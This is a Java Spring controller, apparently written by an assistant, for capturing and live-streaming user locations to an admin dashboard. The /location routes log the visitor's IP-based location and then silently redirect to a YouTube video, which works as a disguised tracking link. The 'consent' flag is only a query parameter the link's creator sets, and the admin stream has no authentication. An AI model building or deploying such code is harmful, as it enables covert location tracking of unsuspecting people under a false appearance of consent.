
package com.secure.hms.controller;

import java.net.URI;
import java.util.HashMap;
import java.util.Map;

import com.secure.hms.service.LocationService;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.http.CacheControl;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

@RestController
public class LocationController {

    private static final String YOUTUBE_URL =
            "https://www.youtube.com/watch?v=Ae66MhGBDTA"
            + "&list=RDAe66MhGBDTA&start_radio=1";

    private final LocationService locationService;

    public LocationController(LocationService locationService) {
        this.locationService = locationService;
    }

    // IP-based location followed by a redirect.
    @GetMapping("/location")
    public ResponseEntity<?> captureLocation(
            @RequestParam(required = false) String userId,
            @RequestParam(defaultValue = "false") boolean consent,
            HttpServletRequest request) {

        return captureIpLocation(userId, consent, request);
    }

    // HTML-free route: this records IP-based location, not device GPS.
    @GetMapping("/location/gps")
    public ResponseEntity<?> captureGpsLocation(
            @RequestParam(required = false) String userId,
            @RequestParam(defaultValue = "false") boolean consent,
            HttpServletRequest request) {

        return captureIpLocation(userId, consent, request);
    }

    private ResponseEntity<?> captureIpLocation(
            String userId,
            boolean consent,
            HttpServletRequest request) {

        if (!consent) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN)
                    .contentType(MediaType.TEXT_PLAIN)
                    .body("Location reporting requires informed consent.");
        }

        Map<String, Object> body = new HashMap<>();
        body.put("userId", userId);
        body.put("gpsAvailable", false);

        locationService.processLocation(body, getClientIp(request));

        return ResponseEntity.status(HttpStatus.FOUND)
                .location(URI.create(YOUTUBE_URL))
                .build();
    }

    // Receives GPS coordinates submitted by a consent-based browser page.
    @PostMapping(
            value = "/api/location/report",
            consumes = MediaType.APPLICATION_JSON_VALUE,
            produces = MediaType.APPLICATION_JSON_VALUE
    )
    public ResponseEntity<?> reportLocation(
            @RequestBody Map<String, Object> body,
            HttpServletRequest request) {

        if (!Boolean.TRUE.equals(body.get("consent"))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN)
                    .body(Map.of(
                            "error",
                            "Location reporting requires informed consent."
                    ));
        }

        String result = locationService.processLocation(
                body,
                getClientIp(request)
        );

        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(result);
    }

    // Real-time event stream consumed by the admin dashboard.
    @GetMapping(
            value = "/api/location/stream",
            produces = MediaType.TEXT_EVENT_STREAM_VALUE
    )
    public SseEmitter streamLocations() {
        return locationService.subscribe();
    }

    // Admin page: this mapping was missing from your controller.
    @GetMapping(
            value = "/location/admin",
            produces = MediaType.TEXT_HTML_VALUE
    )
    public ResponseEntity<String> adminLocationPage() {
        return ResponseEntity.ok()
                .cacheControl(CacheControl.noStore())
                .body(ADMIN_LOCATION_PAGE);
    }

    private String getClientIp(HttpServletRequest request) {
        // Trust forwarded headers only when set safely by your proxy.
        String forwardedFor = request.getHeader("X-Forwarded-For");

        if (forwardedFor != null && !forwardedFor.isBlank()) {
            return forwardedFor.split(",")[0].trim();
        }

        return request.getRemoteAddr();
    }

    private static final String ADMIN_LOCATION_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin - Live Location Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 24px;
            background: #f4f6f9;
            color: #172033;
        }
        h2 { margin-bottom: 6px; }
        .status { margin: 14px 0 20px; }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #94a3b8;
            margin-right: 7px;
        }
        .panel {
            background: white;
            padding: 18px;
            border-radius: 10px;
            box-shadow: 0 2px 10px #0000000d;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 1000px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #e5e7eb;
            font-size: 13px;
        }
        th { background: #f8fafc; }
        a { color: #2563eb; }
        .muted { color: #64748b; }
    </style>
</head>
<body>
    <h2>Live Location Dashboard</h2>

    <div class="status">
        <span class="dot" id="statusDot"></span>
        <span id="connectionStatus">Connecting...</span>
        | Reports: <strong id="count">0</strong>
    </div>

    <div class="panel">
        <table>
            <thead>
                <tr>
                    <th>User ID</th>
                    <th>Reported At</th>
                    <th>GPS Available</th>
                    <th>GPS Latitude</th>
                    <th>GPS Longitude</th>
                    <th>Accuracy (m)</th>
                    <th>IP City / Region</th>
                    <th>Country</th>
                    <th>Map</th>
                </tr>
            </thead>
            <tbody id="reports">
                <tr id="placeholder">
                    <td colspan="9" class="muted">
                        Waiting for location reports...
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <script>
        const reports = document.getElementById("reports");
        const count = document.getElementById("count");
        const statusText = document.getElementById("connectionStatus");
        const statusDot = document.getElementById("statusDot");

        const rows = new Map();
        let anonymousCounter = 0;

        function addCell(row, value) {
            const td = document.createElement("td");
            td.textContent =
                value === null || value === undefined || value === ""
                    ? "—" : String(value);
            row.appendChild(td);
        }

        function renderReport(data) {
            const placeholder = document.getElementById("placeholder");
            if (placeholder) placeholder.remove();

            const key = data.userId
                ? "user:" + data.userId
                : "anonymous:" + (++anonymousCounter);

            let row = rows.get(key);

            if (!row) {
                row = document.createElement("tr");
                rows.set(key, row);
            }

            row.replaceChildren();

            addCell(row, data.userId);
            addCell(row, data.capturedAt);
            addCell(row, data.gpsAvailable ? "Yes" : "No");
            addCell(row, data.gpsLatitude);
            addCell(row, data.gpsLongitude);
            addCell(row, data.gpsAccuracy);
            addCell(
                row,
                [data.ipCity, data.ipRegion]
                    .filter(Boolean).join(", ")
            );
            addCell(row, data.ipCountry);

            const mapCell = document.createElement("td");

            const latitude = data.gpsAvailable
                ? data.gpsLatitude : data.ipLatitude;
            const longitude = data.gpsAvailable
                ? data.gpsLongitude : data.ipLongitude;

            if (latitude !== null && latitude !== undefined
                    && longitude !== null && longitude !== undefined
                    && Number.isFinite(Number(latitude))
                    && Number.isFinite(Number(longitude))) {

                const link = document.createElement("a");
                link.href = "https://www.google.com/maps?q="
                    + encodeURIComponent(latitude + "," + longitude);
                link.textContent = "Open Map";
                link.target = "_blank";
                link.rel = "noopener noreferrer";
                mapCell.appendChild(link);
            } else {
                mapCell.textContent = "Unavailable";
            }

            row.appendChild(mapCell);
            reports.prepend(row);
            count.textContent = rows.size;
        }

        const stream = new EventSource("/api/location/stream");

        stream.addEventListener("open", () => {
            statusText.textContent = "Connected — live updates enabled";
            statusDot.style.background = "#16a34a";
        });

        stream.addEventListener("location", event => {
            try {
                renderReport(JSON.parse(event.data));
            } catch (error) {
                console.error("Invalid location report", error);
            }
        });

        stream.addEventListener("error", () => {
            statusText.textContent =
                "Disconnected — attempting to reconnect";
            statusDot.style.background = "#dc2626";
        });
    </script>
</body>
</html>
""";
}
